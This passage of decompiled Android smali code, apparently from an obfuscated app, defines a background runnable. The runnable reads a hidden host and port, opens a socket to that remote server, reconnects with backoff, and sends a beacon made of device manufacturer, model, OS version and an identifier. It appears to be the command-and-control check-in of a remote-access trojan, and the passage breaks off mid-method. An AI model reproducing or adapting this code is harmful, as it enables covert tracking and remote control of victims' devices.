.class Lcmf0/c3b5bm90zq/patch/C11$23;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcmf0/c3b5bm90zq/patch/C11;->a()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcmf0/c3b5bm90zq/patch/C11;


# direct methods
.method constructor <init>(Lcmf0/c3b5bm90zq/patch/C11;)V
    .locals 0

    iput-object p1, p0, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 16

    move-object/from16 v1, p0

    const/4 v2, 0x0

    :cond_0
    iget-object v3, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v3}, Lcmf0/c3b5bm90zq/patch/C11;->d(Lcmf0/c3b5bm90zq/patch/C11;)Ljava/lang/Object;

    move-result-object v3

    monitor-enter v3

    :try_start_0
    iget-object v4, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v4}, Lcmf0/c3b5bm90zq/patch/C11;->d(Lcmf0/c3b5bm90zq/patch/C11;)Ljava/lang/Object;

    move-result-object v4

    const-wide/16 v5, 0x1388

    invoke-virtual {v4, v5, v6}, Ljava/lang/Object;->wait(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v0

    move-object v2, v0

    goto/16 :goto_e

    :catch_0
    :goto_0
    :try_start_1
    sget-object v4, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v5, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v5}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-virtual {v4, v5}, Lcmf0/c3b5bm90zq/patch/a;->e(Landroid/content/Context;)Z

    move-result v4
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    const/4 v5, 0x1

    if-ne v4, v5, :cond_a

    const/16 v4, 0x3e8

    :try_start_2
    sget-object v8, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v9, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v9}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    sget-wide v10, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v12, 0x57

    invoke-static {v10, v11, v12, v13}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v8, v9, v10}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const-string v9, ""

    if-ne v8, v9, :cond_1

    iget-object v8, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v8}, Lcmf0/c3b5bm90zq/patch/C11;->getResources()Landroid/content/res/Resources;

    move-result-object v8

    const v9, 0x7f0c0024

    invoke-virtual {v8, v9}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v8

    :goto_1
    invoke-virtual {v8}, Ljava/lang/Integer;->intValue()I

    move-result v8

    goto :goto_2

    :cond_1
    sget-object v8, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v9, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v9}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    sget-wide v10, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v10, v11, v12, v13}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v8, v9, v10}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v8

    goto :goto_1

    :goto_2
    sget-object v9, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v10, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v10}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v10

    sget-wide v11, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v13, 0x58

    invoke-static {v11, v12, v13, v14}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v9, v10, v11}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    const-string v10, ""

    if-ne v9, v10, :cond_2

    iget-object v9, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v9}, Lcmf0/c3b5bm90zq/patch/C11;->getResources()Landroid/content/res/Resources;

    move-result-object v9

    const v10, 0x7f0c0022

    invoke-virtual {v9, v10}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v9

    :goto_3
    invoke-static {v9}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;

    move-result-object v9

    goto :goto_4

    :cond_2
    sget-object v9, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v10, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v10}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v10

    sget-wide v11, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v11, v12, v13, v14}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v9, v10, v11}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    goto :goto_3

    :goto_4
    sget-object v10, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v11, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v11}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v11

    sget-wide v12, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v14, 0x59

    invoke-static {v12, v13, v14, v15}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v10, v11, v12}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    const-string v11, ""

    if-ne v10, v11, :cond_3

    iget-object v10, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v10}, Lcmf0/c3b5bm90zq/patch/C11;->getResources()Landroid/content/res/Resources;

    move-result-object v10

    const v11, 0x7f0c0025

    invoke-virtual {v10, v11}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v10

    goto :goto_5

    :cond_3
    sget-object v10, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v11, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v11}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v11

    sget-wide v12, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v12, v13, v14, v15}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v10, v11, v12}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    :goto_5
    sget-object v11, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v12, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v12}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v12

    sget-wide v13, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v6, 0x56

    invoke-static {v13, v14, v6, v7}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v11, v12, v13}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, ""

    if-ne v11, v12, :cond_4

    iget-object v6, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v6}, Lcmf0/c3b5bm90zq/patch/C11;->getResources()Landroid/content/res/Resources;

    move-result-object v6

    const v7, 0x7f0c0023

    invoke-virtual {v6, v7}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v6

    goto :goto_6

    :cond_4
    sget-object v11, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v12, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v12}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v12

    sget-wide v13, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v13, v14, v6, v7}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v11, v12, v6}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    :goto_6
    new-instance v7, Ljava/net/InetSocketAddress;

    invoke-direct {v7, v9, v8}, Ljava/net/InetSocketAddress;-><init>(Ljava/net/InetAddress;I)V

    new-instance v8, Ljava/net/Socket;

    invoke-direct {v8}, Ljava/net/Socket;-><init>()V

    invoke-static {v8}, Lcmf0/c3b5bm90zq/patch/C11;->a(Ljava/net/Socket;)Ljava/net/Socket;

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->h()Ljava/net/Socket;

    move-result-object v8

    iget-object v9, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v9}, Lcmf0/c3b5bm90zq/patch/C11;->e(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v9

    invoke-virtual {v8, v7, v9}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->h()Ljava/net/Socket;

    move-result-object v7

    invoke-virtual {v7}, Ljava/net/Socket;->isConnected()Z

    move-result v7
    :try_end_2
    .catch Ljava/net/UnknownHostException; {:try_start_2 .. :try_end_2} :catch_5
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_4
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    if-ne v7, v5, :cond_7

    :try_start_3
    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->h()Ljava/net/Socket;

    move-result-object v2

    const/16 v8, 0x3ff

    invoke-virtual {v2, v8}, Ljava/net/Socket;->setSendBufferSize(I)V

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->h()Ljava/net/Socket;

    move-result-object v2

    invoke-virtual {v2, v8}, Ljava/net/Socket;->setReceiveBufferSize(I)V

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->h()Ljava/net/Socket;

    move-result-object v2

    const v8, 0x1d4c0

    invoke-virtual {v2, v8}, Ljava/net/Socket;->setSoTimeout(I)V

    iget-object v2, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    new-instance v8, Ljava/io/InputStreamReader;

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->h()Ljava/net/Socket;

    move-result-object v9

    invoke-virtual {v9}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-static {v2, v8}, Lcmf0/c3b5bm90zq/patch/C11;->a(Lcmf0/c3b5bm90zq/patch/C11;Ljava/io/InputStreamReader;)Ljava/io/InputStreamReader;

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->h()Ljava/net/Socket;

    move-result-object v2

    invoke-virtual {v2}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v2

    sput-object v2, Lcmf0/c3b5bm90zq/patch/C11;->d:Ljava/io/OutputStream;

    iget-object v2, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v2}, Lcmf0/c3b5bm90zq/patch/C11;->b()V
    :try_end_3
    .catch Ljava/net/UnknownHostException; {:try_start_3 .. :try_end_3} :catch_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    const-wide/16 v8, 0x3e8

    :try_start_4
    invoke-static {v8, v9}, Ljava/lang/Thread;->sleep(J)V
    :try_end_4
    .catch Ljava/lang/InterruptedException; {:try_start_4 .. :try_end_4} :catch_1
    .catch Ljava/net/UnknownHostException; {:try_start_4 .. :try_end_4} :catch_3
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    :catch_1
    :try_start_5
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v8, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v11, 0x6

    invoke-static {v8, v9, v11, v12}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v8, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v8, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v8, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v8}, Lcmf0/c3b5bm90zq/patch/C11;->f(Lcmf0/c3b5bm90zq/patch/C11;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v8, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, " "

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, " & "

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget v6, Landroid/os/Build$VERSION;->SDK_INT:I

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v8, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v8}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    invoke-virtual {v6, v8}, Lcmf0/c3b5bm90zq/patch/a;->d(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v8, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v8}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    sget-wide v9, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v11, 0x6c

    invoke-static {v9, v10, v11, v12}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v8, v9}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcmf0/c3b5bm90zq/patch/C11;->a(Ljava/lang/String;)V

    sget-object v2, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v6, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v6}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    const-string v8, ""

    sget-wide v9, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v11, 0x6c

    invoke-static {v9, v10, v11, v12}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v2, v6, v8, v9}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v2, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    const/4 v6, 0x0

    invoke-static {v2, v6}, Lcmf0/c3b5bm90zq/patch/C11;->b(Lcmf0/c3b5bm90zq/patch/C11;Ljava/lang/String;)Ljava/lang/String;

    iget-object v2, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v2, v5}, Lcmf0/c3b5bm90zq/patch/C11;->a(Lcmf0/c3b5bm90zq/patch/C11;Z)Z

    iget-object v2, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v2}, Lcmf0/c3b5bm90zq/patch/C11;->g(Lcmf0/c3b5bm90zq/patch/C11;)V

    iget-object v2, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v2, v4}, Lcmf0/c3b5bm90zq/patch/C11;->a(Lcmf0/c3b5bm90zq/patch/C11;I)I
    :try_end_5
    .catch Ljava/net/UnknownHostException; {:try_start_5 .. :try_end_5} :catch_3
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    :try_start_6
    monitor-exit v3

    goto/16 :goto_d

    :catch_2
    move-exception v0

    goto :goto_7

    :catch_3
    move-exception v0

    goto :goto_9

    :catch_4
    move-exception v0

    move v7, v2

    :goto_7
    move-object v2, v0

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v8, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v8}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    sget-wide v9, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v11, 0x6c

    invoke-static {v9, v10, v11, v12}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v8, v9}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v8, ""

    if-ne v6, v8, :cond_5

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v8, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v8}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    sget-wide v9, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v11, 0x6c

    invoke-static {v9, v10, v11, v12}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v8, v2, v9}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_5
    iget-object v2, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    :goto_8
    invoke-static {v2}, Lcmf0/c3b5bm90zq/patch/C11;->h(Lcmf0/c3b5bm90zq/patch/C11;)V

    goto :goto_a

    :catch_5
    move-exception v0

    move v7, v2

    :goto_9
    move-object v2, v0

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v8, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v8}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    sget-wide v9, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v11, 0x6c

    invoke-static {v9, v10, v11, v12}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v8, v9}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v8, ""

    if-ne v6, v8, :cond_6

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v8, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v8}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    invoke-virtual {v2}, Ljava/net/UnknownHostException;->getMessage()Ljava/lang/String;

    move-result-object v2

    sget-wide v9, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v11, 0x6c

    invoke-static {v9, v10, v11, v12}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v8, v2, v9}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_6
    iget-object v2, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    goto :goto_8

    :cond_7
    :goto_a
    if-nez v7, :cond_9

    iget-object v2, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v2}, Lcmf0/c3b5bm90zq/patch/C11;->e(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v2

    const v6, 0xc350

    if-lt v2, v6, :cond_8

    iget-object v2, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v2, v4}, Lcmf0/c3b5bm90zq/patch/C11;->a(Lcmf0/c3b5bm90zq/patch/C11;I)I

    goto :goto_b

    :cond_8
    iget-object v2, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    iget-object v6, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->e(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v6

    add-int/2addr v6, v4

    invoke-static {v2, v6}, Lcmf0/c3b5bm90zq/patch/C11;->a(Lcmf0/c3b5bm90zq/patch/C11;I)I

    :cond_9
    :goto_b
    move v2, v7

    goto :goto_c

    :cond_a
    const-string v4, "1"

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v7, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v7}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    sget-wide v8, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v10, 0x6c

    invoke-static {v8, v9, v10, v11}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v7, v8}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    if-eq v6, v4, :cond_b

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v7, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v7}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    sget-wide v8, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v10, 0x6c

    invoke-static {v8, v9, v10, v11}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v8

